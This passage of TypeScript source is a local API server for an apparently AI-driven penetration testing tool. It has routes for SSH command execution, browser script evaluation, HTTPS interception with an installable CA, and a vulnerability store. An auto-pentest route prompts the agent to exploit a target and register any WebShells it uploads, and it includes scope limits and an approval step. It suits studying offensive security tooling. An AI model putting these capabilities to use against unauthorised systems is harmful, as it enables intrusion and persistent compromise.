          res.write(`data: ${JSON.stringify({ type: 'hello', ts: Date.now() })}\n\n`)
          this.sseClients.add(res)
          req.on('close', () => this.sseClients.delete(res))
          break
        }
        // ---------------- 浏览器控制 ----------------
        case '/api/chat': {
          const body = JSON.parse(await this.readBody(req)) as { message: string; stream?: boolean }
          if (!body.message) throw new Error('empty message')
          if (body.stream) {
            // SSE 流式对话（经本地 gateway，与渗透同通道）：message.delta → data:{"type":"delta"...}；收尾 data:{"type":"done"...}
            // 客户端断开（abort）→ 触发 gateway stop（不中断渗透/分析，独立会话）
            res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache', connection: 'keep-alive', ...CORS })
            let closed = false
            const send = (obj: unknown) => { if (!closed) { try { res.write(`data: ${JSON.stringify(obj)}\n\n`) } catch { /* 客户端已断开 */ } } }
            const stop = (abort: () => void) => { req.on('close', () => { closed = true; try { abort() } catch { /* 已结束 */ } }) }
            try {
              // 主 Agent 聊天框：注入 Neo4j 图上下文（全局情报/漏洞/凭据/WebShell/渗透状态），与流量分析/渗透通道一致
              const gctx = await this.digestPrompt()
              const input = `${gctx ? gctx : ''}${this.toolsHint()}【用户消息】${body.message}`
              // chatViaGateway 的 onEvent 已推送 done/error，这里只需等它完成并结束响应
              await this.chatViaGateway(input, this.chatSessionId, (ev) => send(ev), stop)
              // 主 Agent 回流：用户消息中含目标 URL/明确指示 → 写入全局情报（子 Agent 共享，最高优先级）
              const msgUrl = (body.message || '').match(/https?:\/\/[^\s"'）)\]]+/)?.[0]
              const msgKey = (body.message || '').match(/(?:目标|target|渗透|测试)[:：]?\s*([a-zA-Z0-9.\-:]+)/)?.[1]
              const refUrl = msgUrl || msgKey
              if (refUrl) {
                const nHost = this.hostOf(msgUrl || refUrl.includes('://') ? msgUrl || refUrl : `http://${refUrl}`)
                const nPath = msgUrl ? msgUrl.replace(/^https?:\/\/[^/]+/i, '') : ''
                this.pushDigest({ kind: 'note', host: nHost, path: nPath, data: `主 Agent 指示：${body.message.slice(0, 80)}`, persist: true })
              }
            } catch (e) {
              if (!closed) send({ type: 'error', error: e instanceof Error ? e.message : String(e) })
            }
            res.end()
            break
          }
          const reply = await this.hermesChat(body.message, await this.digestPrompt(), this.toolsHint())
          this.json(res, 200, { reply, sessionId: this.analyzeSlots[0] })
          break
        }
        // ---------------- Agent Bridge 运行中引导（steer）/ 状态 / 中断 ----------------
        // ---------------- 主对话历史（Hermes Agent 聊天框；项目级，随快照持久化/恢复） ----------------
        case '/api/chat/history': {
          if (req.method === 'GET') {
            this.json(res, 200, { items: this.chatHistory })
          } else if (req.method === 'POST') {
            const b = JSON.parse(await this.readBody(req)) as { role?: string; text?: string; messages?: { role?: string; text: string; ts?: number }[] }
            if (Array.isArray(b.messages)) {
              for (const m of b.messages) {
                if (!m || m.text === undefined) continue
                this.chatHistory.push({ role: m.role === 'user' ? 'user' : 'ai', text: String(m.text).slice(0, 4000), ts: m.ts || Date.now() })
              }
            } else if (b.text !== undefined) {
              this.chatHistory.push({ role: b.role === 'user' ? 'user' : 'ai', text: String(b.text).slice(0, 4000), ts: Date.now() })
            }
            if (this.chatHistory.length > ApiServer.CHAT_HISTORY_CAP) this.chatHistory.splice(0, this.chatHistory.length - ApiServer.CHAT_HISTORY_CAP)
            this.json(res, 200, { ok: true })
          } else if (req.method === 'DELETE') {
            this.chatHistory = []
            this.queueSessionSave()  // 清空后合并异步落盘（防重启恢复旧历史）
            this.json(res, 200, { ok: true })
          } else { this.json(res, 405, { error: 'method not allowed' }) }
          break
        }
        case '/api/chat/steer': {
          const body = JSON.parse(await this.readBody(req)) as { text: string; sessionId?: string }
          if (!body.text) throw new Error('text 缺失')
          const sid = body.sessionId || this.chatSessionId || `pentbox-chat-${Date.now()}`
          if (body.sessionId) this.chatSessionId = sid
          await this.ensureBridge()
          if (!this.bridgeReady) throw new Error('Agent Bridge 未就绪')
          const r = await this.bridge.steer(sid, body.text, 'hermespentbox')
          this.json(res, 200, r)
          break
        }
        case '/api/chat/status': {
          const body = JSON.parse(await this.readBody(req)) as { sessionId?: string }
          const sid = body.sessionId || this.chatSessionId
          await this.ensureBridge()
          if (!sid || !this.bridgeReady) { this.json(res, 200, { exists: false, running: false }); break }
          this.json(res, 200, await this.bridge.status(sid, 'hermespentbox'))
          break
        }
        case '/api/chat/interrupt': {
          const body = JSON.parse(await this.readBody(req)) as { sessionId?: string; message?: string }
          const sid = body.sessionId || this.chatSessionId
          await this.ensureBridge()
          if (sid && this.bridgeReady) await this.bridge.interrupt(sid, body.message, 'hermespentbox').catch((e) => console.warn('[pentbox] 中断失败:', String(e).slice(0, 100)))
          this.json(res, 200, { ok: true })
          break
        }
        case '/api/browser/launch': {
          const body = JSON.parse(await this.readBody(req)) as { engine?: 'chrome' | 'firefox'; proxyPort?: number; customProxy?: string; headless?: boolean; port?: number; url?: string }
          const engine = body.engine ?? 'chrome'
          const lopts = { proxyPort: body.proxyPort || this.opts.proxyPort, customProxy: body.customProxy, headless: body.headless, url: body.url }
          if (engine === 'chrome') {
            if (!this.deps.chrome) throw new Error('chrome not wired')
            await this.deps.chrome.launch({ ...lopts, port: body.port })
          } else {
            if (!this.deps.firefox) throw new Error('firefox not wired')
            await this.deps.firefox.launch(lopts)
          }
          // 类 Burp：不忽略证书错误，HTTPS 抓包要求浏览器信任 pentbox CA（未安装则提示，安装后浏览器重试即可）
          const { isCaTrusted } = await import('../core/mitm.ts')
          const caTrusted = isCaTrusted()
          this.json(res, 200, { ok: true, engine, warning: caTrusted ? undefined : 'pentbox CA 未安装到系统证书库：HTTPS 站点将提示证书错误。请到 设置→网络配置→一键安装 CA，然后重试访问。' })
          break
        }
        case '/api/browser/navigate': {
          const body = JSON.parse(await this.readBody(req)) as { url: string; engine?: string }
          // 按 engine 或当前运行中的浏览器选（chrome 对象恒存在但可能未启动，不能直接 ??）
          const b = body.engine === 'firefox'
            ? (this.deps.firefox?.isRunning() ? this.deps.firefox : null)
            : body.engine === 'chrome'
              ? (this.deps.chrome?.isRunning() ? this.deps.chrome : null)
              : ((this.deps.chrome?.isRunning() ? this.deps.chrome : null) ?? (this.deps.firefox?.isRunning() ? this.deps.firefox : null))
          if (!b) throw new Error('browser not launched')
          await b.navigate(body.url)
          this.json(res, 200, { ok: true })
          break
        }
        case '/api/browser/eval': {
          const body = JSON.parse(await this.readBody(req)) as { expression: string }
          const b = this.deps.chrome ?? this.deps.firefox
          if (!b) throw new Error('browser not launched')
          this.json(res, 200, { result: await b.evaluate(body.expression) })
          break
        }
        case '/api/browser/stop': {
          await this.deps.chrome?.stop()
          await this.deps.firefox?.stop()
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- SSH ----------------
        case '/api/ssh/connect': {
          if (!this.deps.ssh) throw new Error('ssh not wired')
          const body = JSON.parse(await this.readBody(req)) as { host: string; port?: number; username: string; password?: string }
          await this.deps.ssh.connect(body)
          this.json(res, 200, { ok: true })
          break
        }
        case '/api/ssh/exec': {
          if (!this.deps.ssh || !this.deps.ssh.isConnected()) throw new Error('ssh not connected')
          const body = JSON.parse(await this.readBody(req)) as { command: string }
          this.json(res, 200, await this.deps.ssh.exec(body.command, { timeout: 30000 }))
          break
        }
        case '/api/ssh/close': {
          this.deps.ssh?.close()
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- Hermes 对接 ----------------
        case '/api/hermes/test': {
          const body = JSON.parse(await this.readBody(req)) as { gateway?: string; token?: string }
          const gw = (body.gateway ?? '').replace(/\/+$/, '')
          if (!gw) throw new Error('gateway URL 为空')
          const headers: Record<string, string> = body.token ? { authorization: `Bearer ${body.token}` } : {}
          const health = await fetch(`${gw}/v1/health`, { headers, signal: AbortSignal.timeout(5000) })
            .then((r) => r.json())
            .catch((e) => { throw new Error(`health 失败: ${e.message}`) })
          let models: string[] = []
          let current = ''
          // 真实模型清单（/v1/models 只返回 hermes-agent 虚拟别名；/api/model/options 是官方真实清单）
          try {
            const mr = await fetch(`${gw}/api/model/options?refresh=false`, { headers, signal: AbortSignal.timeout(8000) })
            if (mr.ok) {
              const mj = await mr.json()
              const providers = Array.isArray(mj.providers) ? mj.providers : []
              current = providers.find((p: any) => p.is_current)?.models?.[0] ?? ''
              // 排除虚拟聚合 provider（moa 的 "default" 非真实 LLM）
              models = providers.filter((p: any) => p.source !== 'virtual' && Array.isArray(p.models) && p.models.length).flatMap((p: any) => p.models)
            }
          } catch { /* models 端点可选 */ }
          this.json(res, 200, { ok: true, health, models: [...new Set(models)], current })
          break
        }
        case '/api/hermes/run': {
          const body = JSON.parse(await this.readBody(req)) as { gateway?: string; token?: string; model?: string; reasoning?: string; input: string }
          const gw = (body.gateway ?? '').replace(/\/+$/, '')
          if (!gw || !body.input) throw new Error('gateway 或 input 为空')
          const headers: Record<string, string> = {
            'content-type': 'application/json',
            ...(body.token ? { authorization: `Bearer ${body.token}` } : {}),
          }
          // 思考深度映射：参考 hermes parse_reasoning_effort + deepseek build_api_kwargs_extras，
          // 传输格式参考 hermes-studio：gateway 兼容标量 model_options.reasoning_effort（api_server.py:208）
          // none→对象形式显式关闭；low/medium/high/xhigh→标量；空→默认（不传）
          const payload: Record<string, unknown> = { input: body.input }
          if (body.model) payload.model = body.model
          const rc = parseReasoningEffort(body.reasoning)
          if (rc) {
            payload.model_options = rc.enabled
              ? { reasoning_effort: rc.effort }
              : { reasoning: { enabled: false } }
          }
          const r = await fetch(`${gw}/v1/runs`, { method: 'POST', headers, body: JSON.stringify(payload), signal: AbortSignal.timeout(15000) })
          const j = await r.json().catch(() => ({}))
          if (!r.ok) throw new Error(j.error ?? j.detail ?? `HTTP ${r.status}`)
          this.json(res, 200, j)
          break
        }
        case '/api/hermes/run/events': {
          // SSE 流式转发：renderer 端 fetch 本端点即可拿到 gateway 事件流
          const gw = (url.searchParams.get('gateway') ?? '').replace(/\/+$/, '')
          const id = url.searchParams.get('id') ?? ''
          const token = url.searchParams.get('token') ?? ''
          if (!gw || !id) { this.json(res, 400, { error: 'gateway/id 缺失' }); break }
          const headers: Record<string, string> = token ? { authorization: `Bearer ${token}` } : {}
          const up = await fetch(`${gw}/v1/runs/${id}/events`, { headers, signal: AbortSignal.timeout(600000) })
          if (!up.ok || !up.body) { this.json(res, 502, { error: `gateway events HTTP ${up.status}` }); break }
          res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache', connection: 'keep-alive', ...CORS })
          const reader = up.body.getReader()
          try {
            for (;;) {
              const { done, value } = await reader.read()
              if (done) break
              res.write(Buffer.from(value))
            }
          } catch {
            // 客户端断开等：直接结束
          } finally {
            reader.releaseLock()
            res.end()
          }
          break
        }
        case '/api/hermes/run/stop': {
          const body = JSON.parse(await this.readBody(req)) as { gateway?: string; token?: string; id: string }
          const gw = (body.gateway ?? '').replace(/\/+$/, '')
          const headers: Record<string, string> = body.token ? { authorization: `Bearer ${body.token}` } : {}
          await fetch(`${gw}/v1/runs/${body.id}/stop`, { method: 'POST', headers, signal: AbortSignal.timeout(5000) }).catch((e) => console.warn('[pentbox] gateway run 停止失败:', String(e).slice(0, 100)))
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- Hermes 运行时模型覆盖（纯 HTTP，无 SSH） ----------------
        // gateway 无 config 写 API；改"当前对接的 LLM"用官方运行时机制：/v1/runs 的 model 参数
        // ---------------- Hermes 已对接的 LLM 模型列表（gateway 官方真实清单 /api/model/options） ----------------
        // /v1/models 只返回虚拟别名（hermes-agent）；真实模型在 /api/model/options（api_server 源码注释：供外部客户端同步 provider 目录）
        case '/api/hermes/models': {
          const gw = (url.searchParams.get('gateway') ?? '').replace(/\/+$/, '')
          const token = url.searchParams.get('token') ?? ''
          if (!gw) { this.json(res, 400, { error: 'gateway 缺失' }); break }
          const headers: Record<string, string> = token ? { authorization: `Bearer ${token}` } : {}
          const mr = await fetch(`${gw}/api/model/options?refresh=false`, { headers, signal: AbortSignal.timeout(8000) })
          if (!mr.ok) { this.json(res, 502, { error: `HTTP ${mr.status}` }); break }
          const mj = await mr.json()
          const providers = Array.isArray(mj.providers) ? mj.providers : []
          const current = providers.find((p: any) => p.is_current)?.models ?? []
          // 排除虚拟聚合 provider（moa 的 "default" 非真实 LLM）
          const available = providers.filter((p: any) => p.source !== 'virtual' && Array.isArray(p.models) && p.models.length).flatMap((p: any) => p.models)
          this.json(res, 200, { models: [...new Set([...current, ...available])], current: current[0] ?? '' })
          break
        }
        // ---------------- Repeater（重发器） ----------------
        case '/api/repeater/send': {
          if (req.method !== 'POST') { this.json(res, 405, { error: 'POST only' }); break }
          try {
            const body = JSON.parse(await this.readBody(req)) as { raw: string }
            const r = await this.repeaterSend(body.raw ?? '')
            this.json(res, 200, { ok: true, ...r })
          } catch (e) {
            this.json(res, 400, { ok: false, error: (e as Error).message })
          }
          break
        }
        // WebSocket 单发（兼容旧端点；协议自动识别已并入 /api/repeater/send）
        case '/api/repeater/ws/send': {
          if (req.method !== 'POST') { this.json(res, 405, { error: 'POST only' }); break }
          try {
            const body = JSON.parse(await this.readBody(req)) as { url: string; payload: string }
            const msg = await this.wsSendOnce(body.url ?? '', body.payload ?? '')
            this.json(res, 200, { ok: true, message: msg })
          } catch (e) {
            this.json(res, 400, { ok: false, error: (e as Error).message })
          }
          break
        }
        // ---------------- Agent 分析队列（消息队列：流量逐个入队，Agent 消费并写回） ----------------
        case '/api/analyze/status': {
          const out: Record<string, unknown> = {}
          for (const [id, s] of this.analyzeMap) out[id] = s
          this.json(res, 200, { items: out })
          break
        }
        case '/api/analyze/next': {
          while (this.analyzeQueue.length) {
            const id = this.analyzeQueue.shift()!
            const st = this.analyzeMap.get(id)
            if (!st || st.state === 'done') continue
            st.state = 'analyzing'
            this.json(res, 200, { flowId: id, detail: st.detail ?? null })
            return
          }
          this.json(res, 200, { flowId: null })
          break
        }
        case '/api/analyze/result': {
          if (req.method !== 'POST') { this.json(res, 405, { error: 'POST only' }); break }
          const b = JSON.parse(await this.readBody(req)) as { flowId: number; vuln: boolean; level?: string }
          const st = this.analyzeMap.get(b.flowId)
          if (st) { st.state = 'done'; st.vuln = !!b.vuln; st.level = b.level ?? 'info' }
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- 漏洞库（Agent 增删改查） ----------------
        case '/api/vulns': {
          if (req.method === 'GET') {
            this.json(res, 200, { items: this.vulns.map(({ reqRaw, resRaw, ...meta }) => meta) })
          } else if (req.method === 'POST') {
            const b = JSON.parse(await this.readBody(req)) as Partial<Vuln>
            const v: Vuln = { id: ++this.vulnSeq, name: b.name ?? '未命名漏洞', level: (['high', 'medium', 'low', 'info'].includes(b.level as string) ? b.level : 'info') as Vuln['level'], cvss: b.cvss ?? '', uri: b.uri ?? '', desc: b.desc ?? '', exploit: b.exploit ?? '', status: (b.status === 'confirmed' || b.status === 'false') ? b.status : 'pending', reqRaw: b.reqRaw ?? '', resRaw: b.resRaw ?? '', ts: Date.now() }
            this.vulns.push(v)
            this.saveVulns()
            this.log('ok', `[漏洞] 新增 ${v.name}(${v.level}) ${v.uri || '(无 URI)'}`)
            // 漏洞入图（Agent 共享）
            const { host, path } = this.splitVulnUri(v.uri)
            if (host && path) { this.graph.writeVuln({ name: v.name, level: v.level, desc: v.desc, host, path, exploit: v.exploit, color: HAE_LEVEL_COLOR[v.level] }); this.invalidateDigestCache(); this.broadcastGraphChange(`新漏洞(${v.level}) ${host}${path}: ${v.name}`) }
            this.json(res, 200, { ok: true, id: v.id })
          } else { this.json(res, 405, { error: 'method not allowed' }) }
          break
        }
        case '/api/vulns/detail': {
          const id = Number(url.searchParams.get('id')) || 0
          const v = this.vulns.find((x) => x.id === id)
          if (!v) { this.json(res, 404, { error: 'not found' }); break }
          if (req.method === 'GET') this.json(res, 200, v)
          else if (req.method === 'PUT') {
            const b = JSON.parse(await this.readBody(req)) as Partial<Vuln>
            if (b.name !== undefined) v.name = b.name
            if (b.level !== undefined && ['high', 'medium', 'low', 'info'].includes(b.level)) v.level = b.level as Vuln['level']
            if (b.cvss !== undefined) v.cvss = b.cvss
            if (b.uri !== undefined) v.uri = b.uri
            if (b.desc !== undefined) v.desc = b.desc
            if (b.exploit !== undefined) v.exploit = b.exploit
            if (b.status === 'confirmed' || b.status === 'pending' || b.status === 'false') v.status = b.status
            if (b.reqRaw !== undefined) v.reqRaw = b.reqRaw
            if (b.resRaw !== undefined) v.resRaw = b.resRaw
            this.saveVulns()
            this.log(b.status === 'confirmed' ? 'ok' : 'info', `[漏洞] 更新 #${v.id} ${v.name}${b.status ? ` → ${b.status === 'false' ? '误报' : b.status === 'confirmed' ? '已确认' : '待验证'}` : ''} ${v.uri || ''}`)
            // 漏洞更新同步入图
            const { host, path } = this.splitVulnUri(v.uri)
            if (host && path) { this.graph.writeVuln({ name: v.name, level: v.level, desc: v.desc, host, path, exploit: v.exploit, color: HAE_LEVEL_COLOR[v.level] }); this.invalidateDigestCache(); this.broadcastGraphChange(`漏洞更新(${v.level}) ${host}${path}: ${v.name}`) }
            this.json(res, 200, { ok: true })
          } else if (req.method === 'DELETE') {
            const vd = this.vulns.find((x) => x.id === id)
            this.vulns = this.vulns.filter((x) => x.id !== id)
            this.saveVulns()
            this.log('warn', `[漏洞] 删除 #${id} ${vd?.name || ''} ${vd?.uri || ''}`)
            // 漏洞从图移除
            if (vd) {
              const { host, path } = this.splitVulnUri(vd.uri)
              if (host && path) this.graph.removeVuln(host, path, vd.name)
            }
            this.json(res, 200, { ok: true })
          } else { this.json(res, 405, { error: 'method not allowed' }) }
          break
        }
        // ---------------- WebShell 管理（CRUD + 命令执行 + 存活探测；经内置代理发出，流量进流量面板） ----------------
        // ---------------- Intercept（请求拦截） ----------------
        case '/api/intercept/state': {
          if (req.method === 'PUT') {
            const body = JSON.parse(await this.readBody(req)) as { enabled: boolean }
            this.engine.setInterceptEnabled(!!body.enabled)
          }
          this.json(res, 200, { enabled: this.engine.interceptEnabled, queue: this.engine.interceptQueue.map((i) => ({ id: i.id, kind: i.kind, method: i.method, url: i.url, ts: i.ts })) })
          break
        }
        case '/api/intercept/forward': {
          const body = JSON.parse(await this.readBody(req)) as { id: number }
          this.json(res, 200, { ok: this.engine.forwardIntercepted(body.id) })
          break
        }
        case '/api/intercept/drop': {
          const body = JSON.parse(await this.readBody(req)) as { id: number }
          this.json(res, 200, { ok: this.engine.dropIntercepted(body.id) })
          break
        }
        // ---------------- WebSockets History（CDP 捕获的 WS 帧） ----------------
        case '/api/wsflows': {
          this.json(res, 200, { items: this.wsFlows.slice(-200).reverse() })
          break
        }
        // ---------------- MITM（HTTPS 抓包/拦截：CA 管理 + 开关） ----------------
        case '/api/mitm/state': {
          if (req.method === 'PUT') {
            const body = JSON.parse(await this.readBody(req)) as { enabled: boolean }
            this.engine.mitmEnabled = !!body.enabled
          }
          this.json(res, 200, { enabled: this.engine.mitmEnabled })
          break
        }
        case '/api/mitm/ca': {
          const { getCaCertPem, getCaCertPath, isCaTrusted } = await import('./mitm.ts')
          this.json(res, 200, { path: getCaCertPath(), pem: getCaCertPem(), trusted: isCaTrusted() })
          break
        }
        case '/api/mitm/ca/install': {
          const { installCa } = await import('./mitm.ts')
          this.json(res, 200, installCa())
          break
        }
        // ---------------- 本地 Hermes LLM 配置（只读本机 config.yaml 模型段，同机直读文件） ----------------
        case '/api/hermes/local-config': {
          const os2 = await import('node:os')
          const path = await import('node:path')
          const fs = await import('node:fs')
          // 优先 hermespentbox 档案配置（与 HERMES_HOME 一致），fallback 本机 default
          const candidates = [
            path.join(os2.homedir(), 'AppData', 'Local', 'hermes', 'profiles', 'hermespentbox', 'config.yaml'),
            path.join(os2.homedir(), 'AppData', 'Local', 'hermes', 'config.yaml'),
            path.join(os2.homedir(), '.hermes', 'config.yaml'),
          ]
          const cfgPath = candidates.find((p) => fs.existsSync(p))
          if (!cfgPath) throw new Error('未找到本地 hermes config.yaml')
          const text = fs.readFileSync(cfgPath, 'utf8')
          // 行解析 model 段（JS 正则无 \Z；档案 config 可能只有 model 段，段匹配会失败）
          const lines = text.split(/\r?\n/)
          let inModel = false
          const seg: string[] = []
          for (const l of lines) {
            if (/^model:/.test(l)) { inModel = true; continue }
            if (inModel && /^\S/.test(l)) break
            if (inModel) seg.push(l)
          }
          const get = (k: string) => {
            const line = seg.find((l) => l.trim().startsWith(`${k}:`))
            if (!line) return ''
            const v = line.split(':').slice(1).join(':').trim().replace(/^['"]|['"]$/g, '')
            if (k === 'api_key' && v.length > 12) return v.slice(0, 7) + '...' + v.slice(-4)
            return v
          }
          // api_key 从 .env 读（真实 key 走 <PROVIDER>_API_KEY；config.yaml 已不存 key）
          let apiKey = ''
          try {
            const envText = fs.readFileSync(path.join(path.dirname(cfgPath), '.env'), 'utf8')
            const keyName = `${get('provider').toUpperCase().replace(/[^A-Z0-9]/g, '_')}_API_KEY`
            apiKey = envText.match(new RegExp(`^${keyName}=(.*)$`, 'm'))?.[1] ?? ''
            if (apiKey.length > 12) apiKey = apiKey.slice(0, 7) + '...' + apiKey.slice(-4)
          } catch { /* 无 .env 则 apiKey 为空 */ }
          this.json(res, 200, { path: cfgPath, model: { default: get('default'), provider: get('provider'), base_url: get('base_url'), api_key: apiKey } })
          break
        }
        // ---------------- 角色模型管理（以角色为角度：执行官/审计员/审批官 各自独立的模型配置，写各自档案 config.yaml + .env） ----------------
        case '/api/roles/model': {
          if (req.method === 'POST') {
            const b = JSON.parse(await this.readBody(req)) as { role?: string; model?: string; provider?: string; baseUrl?: string; apiKey?: string; reasoning?: string }
            const r = this.agentRoles().find((x) => x.role === b.role)
            if (!r) throw new Error(`未知角色: ${b.role}`)
            if (!b.model) throw new Error('model 缺失')
            await this.applyModelToRole(r.home, { model: b.model, provider: b.provider, baseUrl: b.baseUrl, apiKey: b.apiKey, reasoning: b.reasoning })
            // Agent 管理持久化：三角色模型配置同步写入全局配置（config.bin）——应用侧持久副本（hermes 档案 config.yaml/.env 为运行时配置）
            const agentModels: Record<string, { model: string; provider: string; baseUrl: string; apiKey: string; reasoning: string }> = {}
            for (const rr of this.agentRoles()) {
              const m = this.readRoleModel(rr.home)
              agentModels[rr.role] = { model: m?.default || '', provider: m?.provider || '', baseUrl: m?.base_url || '', apiKey: m?.api_key || '', reasoning: m?.reasoning || '' }
            }
            ApiServer.writeConfig({ agentModels })
            this.log('info', `[模型] ${r.cn}（${r.profile}）模型已更新: ${b.model}${b.provider ? ' · ' + b.provider : ''}${b.reasoning ? ' · 推理 ' + b.reasoning : ''}（已写入持久化）`)
            this.json(res, 200, { ok: true, role: r.role, model: b.model })
          } else {
            const roles = this.agentRoles().map((r) => {
              const m = this.readRoleModel(r.home)
              return { role: r.role, cn: r.cn, profile: r.profile, desc: r.desc, model: m ? { ...m, api_key: m.api_key ? (m.api_key.length > 12 ? m.api_key.slice(0, 7) + '...' + m.api_key.slice(-4) : '***') : '' } : null }
            })
            this.json(res, 200, { roles })
          }
          break
        }
        // 测试指定角色的模型直连（读角色档案配置 + .env 原始 key）
        case '/api/roles/model/test': {
          const b = JSON.parse(await this.readBody(req)) as { role?: string }
          const r = this.agentRoles().find((x) => x.role === b.role)
          if (!r) throw new Error(`未知角色: ${b.role}`)
          const m = this.readRoleModel(r.home)
          if (!m?.default) throw new Error(`角色「${r.cn}」未配置模型`)
          const baseUrl = m.base_url || (m.provider === 'minimax-cn' ? 'https://api.minimaxi.com/v1' : m.provider === 'deepseek' ? 'https://api.deepseek.com/v1' : '')
          if (!baseUrl) throw new Error(`角色「${r.cn}」端点未配置（provider: ${m.provider || '未配置'}）`)
          const rr = await fetch(`${baseUrl.replace(/\/+$/, '')}/chat/completions`, {
            method: 'POST',
            headers: { 'content-type': 'application/json', authorization: `Bearer ${m.api_key}` },
            body: JSON.stringify({ model: m.default, messages: [{ role: 'user', content: 'ping' }], max_tokens: 4 }),
            signal: AbortSignal.timeout(15000),
          })
          const j = await rr.json().catch(() => ({}))
          if (!rr.ok) throw new Error(j.error?.message ?? j.error ?? `HTTP ${rr.status}`)
          this.json(res, 200, { ok: true, role: r.role, model: j.model ?? m.default })
          break
        }
        // 拉取指定角色的可用模型列表（调 {baseUrl}/models，Bearer key 鉴权；供前端角色卡片展示与切换）
        case '/api/roles/model/list': {
          const b = JSON.parse(await this.readBody(req)) as { role?: string }
          const r = this.agentRoles().find((x) => x.role === b.role)
          if (!r) throw new Error(`未知角色: ${b.role}`)
          const m = this.readRoleModel(r.home)
          if (!m?.api_key) throw new Error(`角色「${r.cn}」未配置 API Key`)
          const baseUrl = m.base_url || (m.provider === 'minimax-cn' ? 'https://api.minimaxi.com/v1' : m.provider === 'deepseek' ? 'https://api.deepseek.com/v1' : '')
          if (!baseUrl) throw new Error(`角色「${r.cn}」端点未配置`)
          const rr = await fetch(`${baseUrl.replace(/\/+$/, '')}/models`, {
            headers: { authorization: `Bearer ${m.api_key}` },
            signal: AbortSignal.timeout(15000),
          })
          const j = await rr.json().catch(() => ({}))
          if (!rr.ok) throw new Error(j.error?.message ?? j.error ?? `HTTP ${rr.status}`)
          const ids = Array.isArray(j.data) ? j.data.map((x: { id?: string }) => x.id ?? '').filter(Boolean) : []
          this.json(res, 200, { ok: true, role: r.role, models: ids, current: m.default })
          break
        }
        // 重置指定角色的模型配置（清空 model 段 + .env key/端点；回到未配置状态）
        case '/api/pentest/mode': {
          // 渗透模式三段式：auto=全自动 / passive=被动（默认） / funnel=漏斗
          if (req.method === 'PUT') {
            const b = JSON.parse(await this.readBody(req)) as { mode?: string }
            this.pentestMode = b.mode === 'auto' || b.mode === 'funnel' ? b.mode : 'passive'
            ApiServer.writeConfig({ pentestMode: this.pentestMode })
            const label = this.pentestMode === 'auto' ? '全自动（Agent 负责全部渗透流程）' : this.pentestMode === 'funnel' ? '漏斗（子 Agent 纯审计，主 Agent 复合式全自动渗透）' : '被动（子 Agent 分析+意见卡，主 Agent 等用户沟通）'
            this.log('info', `[模式] 渗透模式切换: ${label}`)
          }
          this.json(res, 200, { mode: this.pentestMode })
          break
        }
        // 全自动渗透（/pentest {domain} 指令入口）：主 Agent 全自动执行完整渗透 + 全局情报复合（全自动/漏斗模式可用）
        case '/api/pentest/auto': {
          const b = JSON.parse(await this.readBody(req)) as { domain?: string }
          const domain = String(b.domain || '').trim().replace(/^https?:\/\//, '').replace(/\/+$/, '')
          if (!domain) throw new Error('domain 缺失')
          if (this.pentestMode === 'passive') throw new Error('被动模式不执行全自动渗透（请切换到 全自动/漏斗 模式）')
          const modeLabel = this.pentestMode === 'auto' ? '全自动' : '漏斗'
          // 所有模式统一过审批官审计（规则层 + 审批 Agent）：全自动渗透任务亦须审批
          const approve = await this.approvePenetration(domain, '全自动渗透', '', `对 ${domain} 执行${modeLabel}渗透（结合全局情报复合式验证）`)
          if (!approve.allowed) {
            this.log('warn', `[渗透] 🚀 ${modeLabel}渗透被审批拦截: ${domain} — ${approve.reason}`)
            this.json(res, 200, { started: false, blocked: true, reason: approve.reason, reply: `渗透被审批拦截：${approve.reason}` })
            break
          }
          this.log('info', `[渗透] 🚀 ${modeLabel}渗透启动: ${domain}`)
          this.json(res, 200, { started: true, mode: this.pentestMode, domain })
          ;(async () => {
            try {
              const digest = await this.digestPrompt()
              const task = `${digest}\n\n（${modeLabel}渗透任务，授权范围内）对目标 ${domain} 执行完整渗透流程：\n1. 站点侦察：DNS/端口/Web 指纹/常见路径/JS 分析\n2. 结合【全局情报】中该主机的已有发现（API/漏洞/凭据/WebShell/渗透状态）复合式利用\n3. 逐个接口验证可利用漏洞，最终输出【VULNDOC】结构化漏洞文档（标题/危害等级/漏洞描述/复现步骤/修复建议/漏洞目标/漏洞路由/原始请求包/原始响应包，格式与子 Agent 一致）\n4. 若渗透过程中上传了 WebShell，立即用 POST http://localhost:8877/api/webshells 同步（body={"type":"godzilla|behinder|antSword","script":"php|jsp|asp|aspx","url":"完整 shell 地址","password":"连接密码","key":"密钥","cryption":"xor|aes"}）\n严格要求：只针对目标 ${domain} 及其子域；禁止破坏性/不可逆操作（删库/清空数据/删文件/格式化/勒索）；禁止输出 JSON 代码，全部文字描述；验证充分后立即结束。`
              const reply = await this.runViaGateway(task, this.chatSessionId || null, () => { /* 主会话执行 */ })
              const parsed = parseVulndoc(reply, '', '')
              if (parsed) {
                const v: Vuln = { id: ++this.vulnSeq, name: parsed.name, level: parsed.level, cvss: '', uri: parsed.uri, desc: parsed.desc, exploit: parsed.exploit, status: 'pending', reqRaw: parsed.reqRaw, resRaw: parsed.resRaw, ts: Date.now() }
                this.vulns.push(v)
                this.saveVulns()
                this.log('ok', `[渗透] 🚀 ${modeLabel}渗透成果: ${v.name}(${v.level}) ${v.uri}`)
                this.pushSse({ type: 'vuln-doc', vuln: { id: v.id, name: v.name, level: v.level, desc: v.desc, exploit: v.exploit, ts: v.ts } })
              } else {
                this.log('info', `[渗透] 🚀 ${modeLabel}渗透完成（无 VULNDOC 成果）: ${domain}`)
              }
              this.pushSse({ type: 'pentest-auto-done', domain, reply })
            } catch (e) {
              this.log('err', `[渗透] 🚀 ${modeLabel}渗透失败: ${String((e as Error).message).slice(0, 150)}`)
              this.pushSse({ type: 'pentest-auto-done', domain, reply: `（${modeLabel}渗透失败：${(e as Error).message}）` })
            }
          })()
          break
        }
        // 全自动模式意见卡 → 主 Agent 全自动渗透单目标（区别于漏斗的 /pentest domain 级：意见驱动、接口级、主 Agent 会话执行完整渗透）
        // ---------------- 渗透执行（对应子 Agent 执行：resume 提出意见的子 Agent 槽位会话；有成果→解析【VULNDOC】写漏洞库 + SSE 推送主 Agent 汇报） ----------------
        case '/api/penetrate': {
          const body = JSON.parse(await this.readBody(req)) as { advice?: string; slot?: number; reqRaw?: string; resRaw?: string; id?: number }
          if (!body.advice) throw new Error('advice 缺失')
